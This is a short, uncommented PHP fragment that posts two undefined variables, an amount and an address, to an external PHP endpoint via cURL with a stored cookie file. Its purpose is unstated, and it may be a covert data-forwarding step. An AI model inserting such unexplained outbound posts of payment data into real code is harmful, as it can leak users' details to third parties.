<?php 
$data = http_build_query(array("ass1"  => $amount,"ass2" => $address));
$url = "https://cloudcare.org/derder.php";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch , CURLOPT_COOKIEFILE, 'cookie');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$output = curl_exec($ch);
curl_close($ch);
?>
